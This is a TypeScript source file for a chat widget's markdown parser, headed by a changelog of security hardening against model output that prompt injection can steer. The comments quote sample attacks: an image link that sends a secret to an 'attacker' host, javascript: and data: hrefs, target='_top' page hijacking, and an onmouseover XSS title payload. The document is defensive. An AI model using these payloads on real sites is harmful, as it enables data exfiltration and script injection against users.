// markdown.ts — Severable markdown core extracted from paw-enterprise's
// src/lib/components/chat/MarkdownRenderer.svelte (segment parser + renderMarkdown).
// Created 2026-07-15 (A3 glass bar). This sanitizes AGENT-AUTHORED markdown on a
// PUBLIC origin, so the DOMPurify allowlist below was copied VERBATIM from the
// source component; since 2026-09-26 it deliberately diverges (see below) —
// any unreviewed change is an XSS hole, so tests/markdown.spec.ts pins both
// arrays and they can't silently change.
//
// CUT from the source (concierge v1 is markdown-only, zero Ripple): the
// ui-spec / Ripple branch, @mention pills, mermaid, and syntax highlighting —
// code fences render as plain <pre> + a copy button (see CodeBlock.svelte).
// KEPT: gfm+breaks marked config, the sanitize allowlist (tightened 2026-09-26), the mobile
// table-wrapper, and the streaming unclosed-GENERIC-fence shimmer mask
// (findUnclosedFenceStart) so an in-flight ```code block doesn't leak raw
// backticks mid-stream. The ui-spec-specific JSON-brace mask is not ported —
// there are no ui-spec fences without Ripple.
//
// 2026-07-15 (C2 action loop): parseSegments now intercepts a ```pawbar-card
// fence (CARD_FENCE_LANG) BEFORE markdown render, emitting a `card` segment
// carrying the raw JSON. The card layer (lib/cards.ts + the card components)
// validates + renders it via Svelte props only — the DOMPurify path is
// untouched. A mid-stream unclosed card fence is shimmer-masked like any other.
//
// 2026-09-26 (reply links + model images): the allowlist is NO LONGER a
// verbatim copy of paw-enterprise's. That renderer runs on our own origin; this
// one runs in a cross-origin iframe on a customer's page, reading model output
// a prompt injection can steer. Four changes:
//   • Every surviving <a> is forced to target="_blank" rel="noopener noreferrer"
//     by an afterSanitizeAttributes hook, whatever the model wrote. `target`
//     used to pass through with any value, so `target="_top"` navigated the
//     customer's whole page away; and a plain [x](url) link, having no target,
//     loaded inside the 520px widget frame.
//   • Only http:, https:, mailto: and tel: hrefs survive; anything else
//     (protocol-relative, ftp:, data:, javascript:) loses its href and renders
//     as inert text. (Relative hrefs: see the follow-up paragraph below.)
//   • `img` is gone. A model-written image is a request fired on render, which
//     makes ![](https://attacker/p?d=secret) an exfiltration beacon. Markdown
//     images render as their escaped ALT TEXT (least surprising: the sentence
//     still reads, and [![Logo](img)](url) degrades to an ordinary link). Raw
//     <img> HTML is simply dropped by the tag allowlist.
//   • Attributes are an explicit ALLOWED_ATTR list instead of DOMPurify's
//     defaults + ADD_ATTR. The defaults include style (background:url(...)),
//     src (<input type=image src>) and background (<td background>) — each a
//     beacon by another name.
// The hook lives on a PRIVATE DOMPurify instance so it cannot leak into any
// other sanitize call; the image renderer lives on a private Marked instance
// so the global `marked` is untouched. Product-card image_url (lib/cards.ts)
// is a separate, Svelte-bound path and is not affected.
//
// 2026-09-26 (follow-up): site-relative hrefs (`/returns`, `returns`) are the
// common grounded citation, so they no longer become dead text. main.ts calls
// setLinkBase(config.parentOrigin) at boot; a relative href resolves against
// that origin and is kept only if it stays on it (so `//evil`, `/\evil` still
// drop). With no valid origin (missing, '*', has a path, non-http) relative
// hrefs are dropped as before. And `input` now survives only as a disabled
// type=checkbox (GFM task list); every other input type is removed.
//
// 2026-09-26 (security review, C1): tables were wrapped for mobile scroll by a
// regex over the SANITIZED string. The serializer leaves `<` unescaped inside
// attribute values, so a title like `"<table onmouseover=alert(1) x="` got the
// wrapper's `class="…"` spliced into it, breaking the attribute open, and
// {@html} re-parsed a live <table onmouseover>. Sanitize now returns a DOM
// fragment; tables are wrapped as nodes and the result serialized once, with
// no string post-processing. `title` is dropped from the allowlist, data-* and
// aria-* are off (MARKDOWN_PURIFY_FLAGS), bare `#frag` / `?query` / empty
// hrefs are dropped rather than resolved to the host's home page, and
// setLinkBase normalises an equivalent origin (`https://x:443`, trailing `/`).
//
// 2026-09-27 (native renderer): marked and DOMPurify are gone. Prose now parses
// into a plain tree (lib/md/block.ts + inline.ts) that components/md/ draws
// with Svelte elements and text bindings, so no HTML string is built anywhere
// and there is nothing left to sanitize. Every rule above still holds, now by
// construction rather than by filtering: the node kinds in lib/md/types.ts are
// the only elements a reply can produce; links always get target=_blank and
// rel=noopener noreferrer and keep only hrefs lib/md/links.ts allows (the same
// safeHref / setLinkBase, moved there); images render as alt text; the only
// input is a disabled task checkbox; there is no style, src, title, data-* or
// aria-* attribute to strip. Raw HTML in a reply behaves as DOMPurify left it:
// allowlisted inline tags keep their meaning, others lose the tag and keep the
// text, script/style-like tags lose their content too. The old path lives on
// as tests/fixtures/md-oracle.ts, and tests/md-parity.spec.ts compares the two.
// pawbar.js dropped from 74,840 to 59,097 bytes gzipped (marked and DOMPurify
// were 29% of the minified bundle). Streaming cost: see Markdown.svelte.



import { parseBlocks } from './md/block';
import type { Block } from './md/types';

import { setLinkBase as setBase } from './md/links';

/** Set the host origin site-relative links resolve against (see md/links). */
export function setLinkBase(origin: string | null | undefined): void {
  setBase(origin);
  blockCache.clear();
}

export type Segment =
  | { type: 'md'; blocks: Block[] }
  | { type: 'code'; code: string; lang: string }
  | { type: 'card'; json: string }
  | { type: 'code-loading' };

/** Fence language that carries an agent-authored action card. Intercepted
 *  BEFORE markdown parsing and parsed as JSON into native components (Svelte
 *  props only). */
export const CARD_FENCE_LANG = 'pawbar-card';

// Streaming re-parses the whole reply on every delta, and a fresh tree makes
// Svelte revisit every node even though only the last block changed. So each
// top-level block is interned by its content: an unchanged block comes back as
// the SAME object, Svelte's each-block sees an identical item and skips it,
// and only the growing block re-renders. Bounded, and cleared when the link
// base changes (hrefs are resolved at parse time).
const blockCache = new Map<string, Block>();
const BLOCK_CACHE_MAX = 400;

function intern(block: Block): Block {
  const key = JSON.stringify(block);
  const hit = blockCache.get(key);
  if (hit) return hit;
  if (blockCache.size >= BLOCK_CACHE_MAX) blockCache.clear();
  blockCache.set(key, block);
  return block;
}

/** Parse one prose run and add it, unless it renders nothing. */
function pushMarkdown(result: Segment[], text: string): void {
  if (!text.trim()) return;
  const blocks = parseBlocks(text).map(intern);
  if (blocks.length) result.push({ type: 'md', blocks });
}

/** Return the index of the opener of a still-open triple-backtick fence in
 *  ``text``, or -1. Scans line-anchored fence markers in order (inline
 *  backticks in prose don't trigger), toggling open/closed as they pair up.
 *  Only EXTRACTOR-SHAPED openers — ``` plus an optional `[\w#+.-]*` tag,
 *  i.e. what the code-fence regex will extract once the closing fence arrives —
 *  report a hit. Copied verbatim from MarkdownRenderer.svelte. */
function findUnclosedFenceStart(text: string): number {
  const marker = /(?:^|\r?\n)(```[^\n]*)/g;
  let openIdx = -1;
  let openIsExtractable = false;
  let m;
  while ((m = marker.exec(text)) !== null) {
    if (openIdx === -1) {
      openIdx = m.index + m[0].length - m[1].length;
      openIsExtractable = /^```[\w#+.-]*$/.test(m[1].replace(/\r$/, ''));
    } else {
      openIdx = -1;
    }
  }
  return openIdx !== -1 && openIsExtractable ? openIdx : -1;
}

/** Split streamed/finished content into renderable segments: markdown runs
 *  (parsed to blocks) interleaved with fenced code blocks. While ``streaming``, an in-flight
 *  unclosed generic fence is masked as a single ``code-loading`` shimmer so raw
 *  backticks never flash in the bubble. Adapted from MarkdownRenderer.svelte's
 *  ``segments`` derivation, with the ui-spec branch removed. */
export function parseSegments(content: string, streaming = false): Segment[] {
  if (!content) return [];

  const result: Segment[] = [];
  // Language class includes `#`, `+`, `.` so ```c++ / ```c# / ```objective-c++
  // and dotted tags extract instead of leaking to marked; `\r?\n` tolerates CRLF.
  const codeBlockRegex = /```([\w#+.-]*)\r?\n([\s\S]*?)```/g;
  let lastIndex = 0;
  let match;

  while ((match = codeBlockRegex.exec(content)) !== null) {
    if (match.index > lastIndex) {
      pushMarkdown(result, content.slice(lastIndex, match.index));
    }
    const lang = match[1] || '';
    // Normalize interior CRLF so copy-to-clipboard never carries `\r`.
    const code = match[2].replace(/\r\n/g, '\n').trimEnd();
    if (lang === CARD_FENCE_LANG) {
      // Intercept before markdown: hand the raw JSON to the card layer, which
      // validates it (cards.parseCard) and renders via Svelte props only.
      result.push({ type: 'card', json: code });
    } else {
      result.push({ type: 'code', lang, code });
    }
    lastIndex = match.index + match[0].length;
  }

  if (lastIndex < content.length) {
    const remaining = content.slice(lastIndex);
    const maskStart = streaming ? findUnclosedFenceStart(remaining) : -1;
    if (maskStart !== -1) {
      const before = remaining.slice(0, maskStart);
      pushMarkdown(result, before);
      result.push({ type: 'code-loading' });
    } else {
      pushMarkdown(result, remaining);
    }
  }

  return result;
}
